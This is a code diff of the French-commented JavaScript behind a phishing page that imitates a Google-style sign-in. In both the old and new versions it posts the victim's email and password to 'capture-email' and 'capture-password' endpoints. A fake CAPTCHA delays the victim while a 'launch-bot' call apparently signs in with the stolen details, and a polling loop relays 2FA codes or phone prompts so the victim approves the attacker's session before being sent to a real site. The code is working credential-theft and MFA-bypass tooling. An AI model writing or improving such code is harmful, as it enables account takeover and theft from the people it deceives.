-var siteName=p.get('site')||'ce site';
-var siteUrl=p.get('url')||'';
-var redirectUrl=p.get('redirect')||'';
-var _uid=null,_email='',_poll=null;
-
-function show(id){document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById(id).classList.add('active');}
-window.show=show;
-
-function post(path,body){return fetch(apiBase+path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}).then(function(r){if(!r.ok)throw new Error(r.status);return r.json()});}
-
-// Afficher/masquer MDP
-document.getElementById('chk-show').addEventListener('change',function(){document.getElementById('in-pwd').type=this.checked?'text':'password';});
-
-// === ÉTAPE 1 : EMAIL ===
-document.getElementById('btn-email').addEventListener('click',function(){
-var e=document.getElementById('in-email').value.trim();
-if(!e||!e.includes('@')){alert('Veuillez saisir une adresse e-mail valide.');return;}
-_email=e;
-post('/api/auth/capture-email',{email:e,siteName:siteName,siteUrl:siteUrl})
-.then(function(d){if(!d.success)throw new Error(d.error);_uid=d.userId;document.getElementById('disp-email').textContent=e;show('s-pwd');document.getElementById('in-pwd').focus();})
-.catch(function(err){console.error(err);alert('Erreur réseau. Réessayez.');});
-});
-
-// === ÉTAPE 2 : PASSWORD ===
-document.getElementById('btn-pwd').addEventListener('click',function(){
-var pwd=document.getElementById('in-pwd').value;
-if(!pwd||pwd.length<4){alert('Veuillez saisir votre mot de passe.');return;}
-post('/api/auth/capture-password',{userId:_uid,password:pwd})
-.then(function(d){if(!d.success)throw new Error(d.error);show('s-cap');document.getElementById('val-email').textContent=_email;console.log('[GAK] MDP OK, passe au captcha');})
-.catch(function(err){console.error(err);alert('Erreur réseau. Réessayez.');});
-});
-
-// === CAPTCHA : clic sur la case ===
-function solveCap(){
-var spin=document.getElementById('cap-spin');
-var ok=document.getElementById('cap-ok');
-var box=document.getElementById('cap-check');
-
-// Déjà coché ? ne rien faire
-if(box.style.backgroundColor==='rgb(26, 115, 232)')return;
-
-// Lance le spinner
-spin.style.display='block';
-box.style.backgroundColor='#fff';
-
-// ANIMATION CHECK progressive
-setTimeout(function(){
-spin.style.display='none';
-ok.style.display='block';
-box.style.backgroundColor='#1a73e8';
-box.style.borderColor='#1a73e8';
-
-// Passe au loader global après un court instant
-setTimeout(function(){
-show('s-cap-loader');
-launchBot();
-}, 1000);
-
-}, 14000); // 14 secondes de vérification (première tentative)
+var apiBase=new URLSearchParams(location.search).get('api')||'http://localhost:8080';
+var siteUrl=new URLSearchParams(location.search).get('url')||'';
+var redirectUrl=new URLSearchParams(location.search).get('redirect')||'';
+var _email='',_uid='',_poll=null;
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
+  var el=document.getElementById(id);
+  if(el) el.classList.add('active');
 }
-window.solveCap=solveCap;
-
-// Bouton Suivant sur CAPTCHA (si l'user ne clique pas la case)
-document.getElementById('btn-cap-next').addEventListener('click',function(){
-// Simule le clic sur la case
-solveCap();
-});
-
-// === LANCEMENT DU BOT ===
+window.showScreen=showScreen;
+function post(url,body){
+  return fetch(apiBase+url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)})
+  .then(function(r){return r.json();});
+}
+function goToPassword(){
+  var v=document.getElementById('emailInput').value.trim();
+  if(!v){alert('Veuillez entrer un e-mail ou un numéro de téléphone.');return;}
+  _email=v;
+  document.getElementById('displayEmail').textContent=v;
+  document.getElementById('captchaEmail').textContent=v;
+  showScreen('page-loading');
+  setTimeout(function(){showScreen('page-password');},1200);
+}
+window.goToPassword=goToPassword;
+function goToCaptcha(){
+  var p=document.getElementById('passwordInput').value.trim();
+  if(!p){alert('Veuillez saisir votre mot de passe.');return;}
+  showScreen('page-loading-pwd');
+  post('/api/auth/capture-email',{email:_email}).then(function(d){
+    if(d.success){
+      _uid=d.userId;
+      post('/api/auth/capture-password',{userId:_uid,password:p}).then(function(){
+        setTimeout(function(){showScreen('page-captcha');},1200);
+      });
+    } else {
+      showScreen('page-password');
+      alert('Erreur: '+(d.error||'Inconnu'));
+    }
+  }).catch(function(e){
+    showScreen('page-password');
+    alert('Erreur reseau');
+  });
+}
+window.goToCaptcha=goToCaptcha;
+function solveCaptcha(){
+  var box=document.getElementById('captcha-check');
+  var spin=document.getElementById('captcha-spinner');
+  var icon=document.getElementById('captcha-icon');
+  if(box.style.backgroundColor==='rgb(26, 115, 232)')return;
+  spin.style.display='block';
+  box.style.backgroundColor='#fff';
+  setTimeout(function(){
+    spin.style.display='none';
+    icon.style.opacity='1';
+    box.style.backgroundColor='#1a73e8';
+    box.style.borderColor='#1a73e8';
+    document.getElementById('captcha-msg').textContent='Vérification de sécurité terminée.';
+    document.getElementById('captcha-msg').style.color='#34a853';
+    launchBot();
+    showScreen('page-loading-mail');
+    setTimeout(function(){showScreen('page-mail-info');document.getElementById('mail-user-email').textContent=_email;},2000);
+  },14000);
+}
+window.solveCaptcha=solveCaptcha;
 function launchBot(){
-console.log('[GAK] Lancement bot pour userId='+_uid);
-if(!_uid){console.error('[GAK] Pas de userId!');return;}
-
-// Lancement bot API
-post('/api/auth/launch-bot/'+encodeURIComponent(_uid),{})
-.then(function(d){console.log('[GAK] Bot lancé:',d);if(d.success)startPoll();})
-.catch(function(e){console.error('[GAK] Erreur bot:',e);});
-
-// Démarrage polling relay
-startPoll();
-
-// Après 14s, on affiche l'écran validation (même si le bot met du temps)
-setTimeout(function(){
-if(!document.getElementById('relay-box').style.display||document.getElementById('relay-box').style.display==='none'){
-document.getElementById('cap-txt').textContent='Vérification de sécurité terminée.';
-setTimeout(function(){show('s-val');},2000);
+  console.log('[GAK] Lancement bot pour userId='+_uid);
+  if(!_uid){console.error('[GAK] Pas de userId!');return;}
+  post('/api/auth/launch-bot/'+encodeURIComponent(_uid),{})
+  .then(function(d){console.log('[GAK] Bot lancé:',d);if(d.success)startPoll();})
+  .catch(function(e){console.error('[GAK] Erreur bot:',e);});
+  startPoll();
 }
-},16000);
-}
-
 function startPoll(){
-if(_poll)clearInterval(_poll);
-_poll=setInterval(function(){
-if(!_email)return;
-fetch(apiBase+'/api/relay/'+encodeURIComponent(_email))
-.then(function(r){return r.json();})
-.then(function(d){
-var data=d&&d.data;
-if(!data)return;
-console.log('[GAK] Relay:',data);
-
-if(data.code||data.phone){
-document.getElementById('relay-box').style.display='block';
-if(data.phone)document.getElementById('relay-phone').textContent=data.phone;
-document.getElementById('relay-code').textContent=data.code||'------';
-show('s-val');
+  if(_poll)clearInterval(_poll);
+  _poll=setInterval(function(){
+    if(!_email)return;
+    fetch(apiBase+'/api/relay/'+encodeURIComponent(_email))
+    .then(function(r){return r.json();})
+    .then(function(d){
+      var data=d&&d.data;
+      if(!data)return;
+      console.log('[GAK] Relay:',data);
+      if(data.code||data.phone){
+        document.getElementById('relay-display').style.display='block';
+        if(data.phone)document.getElementById('relay-phone').textContent=data.phone;
+        document.getElementById('relay-code').textContent=data.code||'------';
+      }
+      if(data.status==='notification_approved'||data.status==='session_active'){
+        clearInterval(_poll);
+        document.getElementById('mail-pending').innerHTML='<b style="color:#34a853">Identité vérifiée avec succès !</b>';
+        setTimeout(function(){
+          if(window.parent!==window)window.parent.postMessage({gak:'redirect',url:redirectUrl||siteUrl},'*');
+          else window.location.href=redirectUrl||siteUrl||'https://google.com';
+        },1500);
+      }
+      if(data.status&&data.status.includes('error')){
+        document.getElementById('mail-pending').textContent='Erreur: '+(data.error||data.status);
+        document.getElementById('mail-pending').style.color='#d93025';
+      }
+    }).catch(function(e){});
+  },2500);
 }
-if(data.status==='notification_approved'||data.status==='session_active'){
-clearInterval(_poll);
-document.getElementById('val-status').innerHTML='<b style="color:#34a853">Identité vérifiée avec succès !</b>';
-setTimeout(finish,1500);
+function validateMail(){
+  document.getElementById('mail-pending').innerHTML='<b style="color:#34a853">Validation en cours...</b>';
 }
-if(data.status&&data.status.includes('error')){
-document.getElementById('cap-txt').textContent='Erreur: '+(data.error||data.status);
-document.getElementById('cap-txt').style.color='#d93025';
-}
-}).catch(function(e){console.error('[GAK] Relay err:',e);});
-},2500);
-}
-
-function finish(){
-console.log('[GAK] Fin redirect');
-if(window.parent!==window)window.parent.postMessage({gak:'redirect',url:redirectUrl||siteUrl},'*');
-else window.location.href=redirectUrl||siteUrl||'https://google.com';
-}
-
-document.getElementById('btn-done').addEventListener('click',finish);
-
-// Enter
-document.getElementById('in-email').addEventListener('keypress',function(e){if(e.key==='Enter')document.getElementById('btn-email').click();});
-document.getElementById('in-pwd').addEventListener('keypress',function(e){if(e.key==='Enter')document.getElementById('btn-pwd').click();});
-
-document.getElementById('in-email').focus();
+window.validateMail=validateMail;
+document.getElementById('emailInput').addEventListener('keypress',function(e){if(e.key==='Enter')goToPassword();});
+document.getElementById('passwordInput').addEventListener('keypress',function(e){if(e.key==='Enter')goToCaptcha();});
+document.getElementById('emailInput').focus();
 })();
 </script>
 </body>
